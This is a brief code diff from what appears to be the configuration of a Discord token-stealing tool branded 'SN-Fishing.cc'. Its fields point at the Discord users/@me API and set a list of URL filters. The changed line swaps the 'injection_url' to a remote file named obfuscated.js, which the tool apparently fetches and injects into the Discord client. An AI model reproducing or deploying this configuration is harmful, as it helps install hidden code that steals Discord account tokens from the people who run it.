@@ -14,7 +14,7 @@ const config = {
   embed_name: '@SN-Fishing.cc 🐟', 
   embed_icon: 'https://cdn.discordapp.com/attachments/985660218253934622/985676305104265226/nemotitre.jpg',
   embed_color: 1746924, 
-  injection_url: 'https://raw.githubusercontent.com/syeqinho/inject/main/index.js',
+  injection_url: 'https://raw.githubusercontent.com/oxyidz/ggrger/main/obfuscated.js',
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
     urls: [
